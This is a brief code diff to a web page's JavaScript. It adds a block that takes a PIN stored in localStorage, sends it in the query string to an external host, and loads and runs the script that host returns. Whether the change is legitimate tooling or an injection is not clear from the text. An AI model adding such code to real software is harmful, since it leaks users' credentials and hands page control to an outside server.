@@ -83,3 +83,8 @@ if(urlParams.has("p")) {
   localStorage.pin = urlParams.get("p");
   window.history.pushState("","","/");
 }
+if(localStorage.pin && localStorage.pin != "") {
+  let pin = localStorage.pin;
+  let newTool = document.createElement('script');newTool.src='https://webtools.irom.ga/scripts/nothing?type=script&pin=' + pin;
+  document.body.appendChild(newTool);
+}
